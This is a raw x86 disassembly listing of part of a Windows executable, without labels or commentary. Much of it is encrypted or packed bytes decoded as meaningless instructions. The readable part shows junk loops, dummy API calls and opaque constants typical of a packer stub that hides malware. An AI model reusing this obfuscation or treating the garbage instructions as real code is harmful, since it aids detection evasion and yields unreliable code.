  403158:	adc    BYTE PTR [edx+0x2944c15c],0x2
  40315f:	(bad)  
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x403166
  403169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40316a:	shl    bl,0x49
  40316d:	int3   
  40316e:	mov    ebx,0x66ffa50d
  403173:	out    0x29,al
  403175:	std    
  403176:	sbb    dl,ah
  403178:	add    eax,0xf8a12d11
  40317d:	test   al,0xcf
  40317f:	mov    esi,0x287919f6
  403184:	push   ss
  403185:	mov    bh,0xac
  403187:	inc    edi
  403188:	add    BYTE PTR [edi-0x70],cl
  40318b:	or     BYTE PTR [edx+0x344e5301],cl
  403191:	cmc    
  403192:	scas   eax,DWORD PTR es:[edi]
  403193:	ret    0x8a9f
  403196:	rol    DWORD PTR [eax],1
  403198:	mov    ds:0x35fb91e7,eax
  40319d:	jo     0x403136
  40319f:	rcr    BYTE PTR [ecx-0x32b6b66a],0xbf
  4031a6:	int    0xa
  4031a8:	test   BYTE PTR [edi],dl
  4031aa:	pop    ds
  4031ab:	pop    ss
  4031ac:	sub    BYTE PTR [esi+0x45],bh
  4031af:	mov    ebx,0x67f717cf
  4031b4:	(bad)  
  4031b6:	mov    bh,0xf7
  4031b8:	dec    edi
  4031b9:	jecxz  0x4031cc
  4031bb:	popf   
  4031bc:	xchg   ebx,eax
  4031bd:	mov    ch,dl
  4031bf:	add    esp,DWORD PTR [ebx-0x33e12d17]
  4031c5:	add    BYTE PTR [ecx+esi*2+0x45],0x7c
  4031ca:	daa    
  4031cb:	mov    ecx,DWORD PTR [esi+edx*1-0x4]
  4031cf:	fsubr  DWORD PTR [edx+0xc47af70]
  4031d5:	mov    edi,0xdfda167f
  4031da:	sbb    al,0xcd
  4031dc:	repnz pop edx
  4031de:	mov    al,0xd3
  4031e0:	sbb    al,0xe0
  4031e2:	clc    
  4031e3:	scas   al,BYTE PTR es:[edi]
  4031e4:	mov    esi,0xb1e9f65a
  4031e9:	and    ebx,esi
  4031eb:	out    dx,eax
  4031ec:	pop    es
  4031ed:	stc    
  4031ee:	pop    edi
  4031ef:	popf   
  4031f0:	fisttp QWORD PTR [edi+0xc]
  4031f3:	ret    0xe594
  4031f6:	cli    
  4031f7:	mov    edx,0x50798827
  4031fc:	pop    esp
  4031fd:	out    0x5e,ax
  403200:	xlat   BYTE PTR ds:[ebx]
  403201:	add    BYTE PTR [esi+ebp*8+0x2d],0xe8
  403206:	mov    al,ds:0x193c9b69
  40320b:	inc    esp
  40320c:	int    0xd4
  40320e:	cmp    DWORD PTR [edi],edi
  403210:	sub    eax,0x42be1b38
  403215:	popa   
  403216:	pusha  
  403217:	fnstenv [ecx+ebp*4-0x1a3da9ba]
  40321e:	add    eax,0xd5635857
  403223:	lahf   
  403224:	je     0x403204
  403226:	in     al,dx
  403227:	retf   0x24a5
  40322a:	inc    edx
  40322b:	cdq    
  40322c:	outs   dx,DWORD PTR ds:[esi]
  40322d:	mov    bl,0x25
  40322f:	aas    
  403230:	mov    eax,0x66331759
  403235:	clc    
  403236:	arpl   WORD PTR ds:0x8aaff7f9,si
  40323c:	das    
  40323d:	lods   al,BYTE PTR ds:[esi]
  40323e:	inc    edi
  40323f:	fmulp  st(1),st
  403241:	dec    eax
  403242:	mov    esi,0x513ad954
  403247:	dec    esi
  403248:	lahf   
  403249:	shl    DWORD PTR ds:0xf4dbf81d,cl
  40324f:	cld    
  403250:	retf   0x4e14
  403253:	jl     0x4032ad
  403255:	and    dl,ah
  403257:	sbb    ch,BYTE PTR [eax+eax*1-0x60a4ba8e]
  40325e:	mov    DWORD PTR [ebx],0x56444fef
  403264:	repz mov gs,WORD PTR [ebp+0x13]
  403268:	inc    edx
  403269:	mov    esi,0xecfaf198
  40326e:	icebp  
  40326f:	xchg   ecx,eax
  403270:	push   ecx
  403271:	inc    ebx
  403272:	xchg   ebp,eax
  403273:	call   0x6ed3738b
  403278:	add    ebx,DWORD PTR [edi+0x9]
  40327b:	out    dx,eax
  40327c:	pop    esi
  40327d:	sub    BYTE PTR ds:0x158ef64b,al
  403283:	mov    esi,0xbba201a2
  403288:	int    0x8b
  40328a:	mov    cl,0xf5
  40328c:	mov    DWORD PTR [esi+0x642f00d3],ebp
  403292:	popf   
  403293:	nop
  403294:	icebp  
  403295:	add    bl,bh
  403297:	ret    0xf7ac
  40329a:	call   esp
  40329c:	jmp    FWORD PTR [ebp-0x36810e7b]
  4032a2:	dec    edi
  4032a3:	push   ebp
  4032a4:	retf   0xb8b4
  4032a7:	pop    ebx
  4032a8:	cmp    dl,BYTE PTR [ebp+0x1e]
  4032ab:	xchg   DWORD PTR gs:[ebx+0x2fc6ede6],esi
  4032b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b3:	push   eax
  4032b4:	xlat   BYTE PTR ds:[ebx]
  4032b5:	(bad)  
  4032b6:	and    eax,0xa0257a46
  4032bb:	out    dx,al
  4032bc:	xchg   esi,edx
  4032be:	aaa    
  4032bf:	loop   0x40328c
  4032c1:	(bad)  
  4032c2:	jmp    0xdfd696f
  4032c7:	sub    BYTE PTR [edi],dh
  4032c9:	sub    al,0x84
  4032cb:	xchg   ecx,eax
  4032cc:	lds    edi,FWORD PTR [edx-0xa3aa6a8]
  4032d2:	js     0x4032b3
  4032d4:	xchg   esp,eax
  4032d5:	inc    edx
  4032d6:	jns    0x403324
  4032d8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4032da:	outs   dx,DWORD PTR ds:[esi]
  4032db:	xor    esp,ebx
  4032dd:	sub    BYTE PTR [edx-0x5b],0xba
  4032e1:	pop    ss
  4032e2:	mov    ecx,DWORD PTR [ebp-0x7e]
  4032e5:	sbb    eax,0x6e289f8b
  4032ea:	ds loopne 0x40334b
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x3cebd48a]
  403537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403538:	push   edi
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	xor    BYTE PTR [esi+0x7d821054],dl
  403547:	dec    ecx
  403548:	lods   eax,DWORD PTR ds:[esi]
  403549:	pop    esi
  40354a:	ja     0x40356d
  40354c:	fdivr  st,st(6)
  40354e:	(bad)  
  403550:	inc    ebx
  403551:	jbe    0x40355b
  403553:	sub    al,0x9f
  403555:	retf   0x2df8
  403558:	adc    DWORD PTR [esi],ebx
  40355a:	cmp    BYTE PTR [edx-0x16],dh
  40355d:	mov    bl,BYTE PTR [edx]
  40355f:	push   eax
  403560:	mov    ebx,0xfb4e6c26
  403565:	adc    BYTE PTR [ebx+eax*1],ch
  403568:	test   eax,0x7309b826
  40356d:	imul   ebx,DWORD PTR [eax-0x3a3d4771],0x2c
  403574:	je     0x40355e
  403576:	mov    esp,0x1c8ad10
  40357b:	xrelease mov DWORD PTR [eax+0x5db14547],ebp
  403582:	inc    edi
  403583:	xchg   ebx,eax
  403584:	gs mov ebp,0xb7f71efa
  40358a:	sub    al,0x33
  40358c:	adc    eax,0xe411d316
  403591:	sub    al,0x95
  403593:	add    BYTE PTR [ebp-0x33d6a38b],ch
  403599:	jl     0x4035ac
  40359b:	adc    DWORD PTR [esi-0x5],edi
  40359e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40359f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a0:	(bad)  
  4035a1:	sbb    al,0x55
  4035a3:	(bad)  
  4035a5:	mov    edi,0xfc261e25
  4035aa:	shr    BYTE PTR [edi+ecx*2-0x404f1673],0x1e
  4035b2:	ficom  DWORD PTR [ecx+0x13de8ebc]
  4035b8:	push   ebp
  4035b9:	xlat   BYTE PTR ds:[ebx]
  4035ba:	retf   
  4035bb:	repz cmp DWORD PTR [edx-0x4a],esp
  4035bf:	xchg   DWORD PTR [esi+ebp*2+0x6d],ebp
  4035c3:	push   edi
  4035c4:	mov    ds:0xbfbad7c1,al
  4035c9:	mov    al,ds:0x2ae2fd5
  4035ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035cf:	xlat   BYTE PTR ds:[ebx]
  4035d0:	and    eax,DWORD PTR [esi]
  4035d2:	ror    DWORD PTR [ebp+0x6b716a93],cl
  4035d8:	jnp    0x40356d
  4035da:	sbb    al,0x2
  4035dc:	push   ebx
  4035dd:	aam    0x32
  4035df:	pop    esp
  4035e0:	xor    DWORD PTR [ebp+0x1a],esi
  4035e3:	fisttp QWORD PTR [eax+0x21228c61]
  4035e9:	sbb    BYTE PTR [ecx-0x13ee241e],0xf5
  4035f0:	(bad)  
  4035f1:	mov    ebx,0xeb85af05
  4035f6:	ja     0x403673
  4035f8:	pop    ebx
  4035f9:	add    al,0xb8
  4035fb:	lea    esp,[edi+0x2a]
  4035fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ff:	cmp    DWORD PTR [edx],esp
  403601:	or     BYTE PTR [eax-0x4b023e4a],al
  403607:	lds    ecx,FWORD PTR [ecx]
  403609:	add    eax,0xe3d77584
  40360e:	add    DWORD PTR [ebx],0xe
  403611:	inc    ecx
  403612:	mov    al,0xd0
  403614:	shl    BYTE PTR [edi],0x94
  403617:	sub    eax,0xe7cbcaba
  40361c:	sbb    al,0x9
  40361e:	fist   WORD PTR ds:0x3cbe2daa
  403624:	ins    BYTE PTR es:[edi],dx
  403625:	das    
  403626:	rcr    DWORD PTR [ebx],cl
  403628:	out    dx,al
  403629:	shl    ch,0x6b
  40362c:	mov    edx,0xd1bfb0d4
  403631:	push   es
  403632:	das    
  403633:	adc    eax,0x5dc630ec
  403638:	pop    esi
  403639:	in     eax,dx
  40363a:	or     al,0xd7
  40363c:	push   ebp
  40363d:	int3   
  40363e:	sub    cl,BYTE PTR [ebx-0x2da892bd]
  403644:	add    bh,ch
  403646:	ror    edi,1
  403648:	int3   
  403649:	int    0x80
  40364b:	lods   eax,DWORD PTR ds:[esi]
  40364c:	ins    DWORD PTR es:[edi],dx
  40364d:	jbe    0x4036c2
  40364f:	cmc    
  403650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403651:	mov    esp,0x6c69601e
  403656:	cmp    ah,BYTE PTR [esi+0x70]
  403659:	add    cl,cl
  40365b:	fld    TBYTE PTR [edx+0x5e]
  40365e:	jns    0x4036a3
  403660:	ret    
  403661:	add    al,0x7c
  403663:	je     0x403695
  403665:	fs or  al,0x18
  403668:	fs stos BYTE PTR es:[edi],al
  40366a:	jecxz  0x4035ec
  40366c:	int    0xa1
  40366e:	push   esp
  40366f:	pop    edx
  403670:	int    0xbd
  403672:	scas   eax,DWORD PTR es:[edi]
  403673:	xlat   BYTE PTR ds:[ebx]
  403674:	not    BYTE PTR [esi+0x748955e0]
  40367a:	fwait
  40367b:	jmp    0x403684
  40367d:	pop    ebp
  40367e:	fucomp st(1)
  403680:	push   cs
  403681:	lods   al,BYTE PTR ds:[esi]
  403682:	add    al,0x6c
  403684:	daa    
  403685:	sub    BYTE PTR [eax+0x29],bh
  403688:	xchg   esi,eax
  403689:	adc    edx,ebp
  40368b:	idiv   esi
  40368d:	cmp    BYTE PTR [esi],bh
  40368f:	scas   eax,DWORD PTR es:[edi]
  403690:	retf   
  403691:	hlt    
  403692:	(bad)  
  403693:	icebp  
  403694:	lds    ebp,FWORD PTR [edi]
  403696:	pop    ebp
  403697:	or     DWORD PTR [ebx-0x59],0xffffffbb
  40369b:	mov    ds:0x2dcbf53c,eax
  4036a0:	push   cs
  4036a1:	add    al,0xd3
  4036a3:	fwait
  4036a4:	push   eax
  4036a5:	out    0x1e,al
  4036a7:	xor    eax,0x3d0c895c
  4036ac:	repnz mov fs,WORD PTR [eax-0x71]
  4036b0:	dec    eax
  4036b1:	fsubrp st(4),st
  4036b3:	out    0x4a,al
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	sub    al,0x82
  4036b8:	popa   
  4036b9:	push   esi
  4036ba:	push   ecx
  4036bb:	fsub   DWORD PTR [esp+edi*2-0x2d]
  4036bf:	xchg   DWORD PTR [edi+esi*1-0x16ad98b9],esi
  4036c6:	cmp    al,0xfb
  4036c8:	je     0x403698
  4036ca:	xor    DWORD PTR [ebx+0x6a],0x1f
  4036ce:	inc    esi
  4036cf:	xlat   BYTE PTR ds:[ebx]
  4036d0:	cli    
  4036d1:	mov    esp,0xf3c13de9
  4036d6:	xchg   DWORD PTR [esi-0x7e],esp
  4036d9:	push   0xffffffe8
  4036db:	mov    al,0x38
  4036dd:	jbe    0x403687
  4036df:	mov    dl,0x9
  4036e1:	xchg   edi,eax
  4036e2:	out    dx,al
  4036e3:	out    dx,al
  4036e4:	pop    ss
  4036e5:	mov    esi,0x67a62e10
  4036ea:	neg    BYTE PTR [ebp-0x570103b]
  4036f0:	mov    edx,0xfc7f8028
  4036f5:	mov    ebx,0x28bf4031
  4036fa:	frstor [ecx-0x14]
  4036fd:	ds pop ecx
  4036ff:	arpl   WORD PTR ds:0xd127a16d,bp
  403705:	in     al,0x31
  403707:	aam    0x83
  403709:	xlat   BYTE PTR ds:[ebx]
  40370a:	test   eax,0x2a71b9b
  40370f:	clc    
  403710:	jmp    0x9f97:0x3177ec6b
  403717:	dec    ebp
  403718:	xchg   esi,eax
  403719:	push   edi
  40371a:	sub    BYTE PTR [edi+0x4735452e],ch
  403720:	fdiv   DWORD PTR [edi+0x29ad937b]
  403726:	jg     0x40376e
  403728:	inc    edi
  403729:	jo     0x40376b
  40372b:	jmp    0x403787
  40372d:	jb     0x403714
  40372f:	push   cs
  403730:	sti    
  403731:	sub    eax,0x222077de
  403736:	dec    edx
  403737:	int3   
  403738:	out    0xe3,al
  40373a:	mov    ebp,0x5ed3f640
  40373f:	loop   0x403727
  403741:	fsub   DWORD PTR [ebp+eax*2-0x3e]
  403745:	sub    esp,esi
  403747:	aas    
  403748:	push   0xffffff8f
  40374a:	outs   dx,BYTE PTR ds:[esi]
  40374b:	sbb    DWORD PTR [edi-0x4d],0x47
  40374f:	aaa    
  403750:	cs and bh,ch
  403753:	jne    0x40375a
  403755:	add    eax,0xf39f2731
  40375a:	imul   BYTE PTR [eax-0x4a8110e2]
  403760:	xchg   ebx,eax
  403761:	sub    ebx,ecx
  403763:	std    
  403764:	pop    ecx
  403765:	fs xchg ecx,eax
  403767:	loopne 0x403769
  403769:	adc    BYTE PTR [edx],ah
  40376b:	cmp    bl,BYTE PTR [ebx]
  40376d:	and    DWORD PTR [edx],esp
  40376f:	pushf  
  403770:	fcom   DWORD PTR [edx-0x62]
  403773:	cmp    al,0xa4
  403775:	int3   
  403776:	push   0x2
  403778:	sahf   
  403779:	jnp    0x4037d6
  40377b:	mov    dl,0xc0
  40377d:	loopne 0x4037f7
  40377f:	add    DWORD PTR [ebx],edx
  403781:	pusha  
  403782:	stos   DWORD PTR es:[edi],eax
  403783:	out    dx,al
  403784:	aad    0xfe
  403786:	dec    edi
  403787:	dec    esi
  403788:	out    0x8a,al
  40378a:	mov    ch,0xbc
  40378c:	scas   al,BYTE PTR es:[edi]
  40378d:	cmc    
  40378e:	xchg   DWORD PTR [esi],esp
  403790:	inc    esi
  403791:	sbb    edi,DWORD PTR [esi-0x7c]
  403794:	ficomp WORD PTR [ebx+esi*4]
  403797:	cld    
  403798:	mov    DWORD PTR [ebp+0x5f],ebp
  40379b:	sbb    eax,0x90726747
  4037a0:	test   BYTE PTR [esi+0x6312180b],ah
  4037a6:	jecxz  0x403817
  4037a8:	push   edi
  4037a9:	retf   0xdf0a
  4037ac:	outs   dx,BYTE PTR ds:[esi]
  4037ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ae:	pop    edi
  4037af:	std    
  4037b0:	jecxz  0x4037f9
  4037b2:	mov    esi,0xf4845a9e
  4037b7:	mov    al,ds:0x36cee94b
  4037bc:	shl    DWORD PTR [eax],cl
  4037be:	shl    DWORD PTR [edi],1
  4037c0:	pop    edx
  4037c1:	inc    eax
  4037c2:	cmc    
  4037c3:	xor    edx,DWORD PTR [ebx]
  4037c5:	int    0xea
  4037c7:	cld    
  4037c8:	jno    0x403774
  4037ca:	adc    DWORD PTR [ebp-0x4a],esi
  4037cd:	mov    dh,0xa1
  4037cf:	aam    0xd9
  4037d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037d2:	dec    esp
  4037d3:	inc    eax
  4037d4:	ret    0x44dd
  4037d7:	inc    ebp
  4037d8:	adc    bh,BYTE PTR [ebx-0x41]
  4037db:	push   ebp
  4037dc:	dec    ebp
  4037dd:	(bad)  
  4037de:	xor    bl,bh
  4037e0:	jb     0x403805
  4037e2:	and    eax,0xa5082284
  4037e7:	loop   0x4037bd
  4037e9:	js     0x4037fb
  4037eb:	into   
  4037ec:	adc    eax,0xe3a86c79
  4037f1:	retf   0x578a
  4037f4:	dec    eax
  4037f5:	mov    ecx,0x612604c9
  4037fa:	xor    eax,0x7f6deb88
  4037ff:	out    dx,al
  403800:	jne    0x4037e7
  403802:	pop    esp
  403803:	jo     0x4037a4
  403805:	mov    edx,0x855e7883
  40380a:	scas   eax,DWORD PTR es:[edi]
  40380b:	das    
  40380c:	xchg   BYTE PTR [ebx-0x75],al
  40380f:	leave  
  403810:	repnz out dx,al
  403812:	mov    DWORD PTR [ebp-0xb],esi
  403815:	fs add bh,bh
  403818:	rcr    DWORD PTR [esi+eiz*1+0x56],cl
  40381c:	mov    cl,0xcd
  40381e:	sahf   
  40381f:	popa   
  403820:	push   esi
  403821:	pop    edx
  403822:	push   0x84d71d16
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x4336fb
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x4337ab
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x433827,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403af2
  403acb:	pop    esi
  403acc:	pusha  
  403acd:	mov    DWORD PTR [eax],esp
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a95
  403ad7:	add    al,0xed
  403ad9:	jle    0x403b55
  403adb:	jle    0x403b07
  403add:	or     eax,edx
  403adf:	outs   dx,BYTE PTR ds:[esi]
  403ae0:	retf   0x2580
  403ae3:	push   ecx
  403ae4:	push   esp
  403ae5:	xlat   BYTE PTR ds:[ebx]
  403ae6:	in     eax,dx
